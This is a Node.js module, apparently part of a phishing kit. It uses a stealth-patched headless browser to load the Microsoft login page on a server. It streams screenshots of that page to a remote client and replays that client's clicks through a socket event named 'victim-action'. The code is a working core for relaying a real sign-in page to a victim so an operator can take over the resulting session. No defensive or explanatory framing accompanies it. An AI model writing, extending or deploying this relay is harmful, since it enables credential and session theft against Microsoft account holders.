const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[STAGE 1] Triggering Browser Launch for ${socket.id}`);
    let browser;

    try {
        // Optimized for Railway / Nixpacks environment
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process' // Reduces memory footprint in containers
            ]
        });

        console.log(`[STAGE 2] Browser Active. Opening Page...`);
        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        console.log(`[STAGE 3] Navigating to Microsoft...`);
        await page.goto('https://login.microsoftonline.com/', { 
            waitUntil: 'networkidle2', 
            timeout: 60000 
        });

        // Function to push frames through the WebSocket
        const pushFrame = async () => {
            try {
                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                socket.emit('browser-render', { screenshot });
            } catch (e) {
                console.error("[!] Frame Sync Error:", e.message);
            }
        };

        // Send the very first frame
        await pushFrame();
        console.log(`[STAGE 4] First Frame Pushed to Socket.`);

        socket.on('victim-action', async (data) => {
            if (data.type === 'click') {
                await page.mouse.click(data.x, data.y);
                await pushFrame(); // Immediate feedback
            }
        });

        socket.on('disconnect', async () => {
            console.log(`[CLEANUP] Closing browser for ${socket.id}`);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL] Startup Failed:', error.message);
        socket.emit('error', { msg: "Environment setup failed" });
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
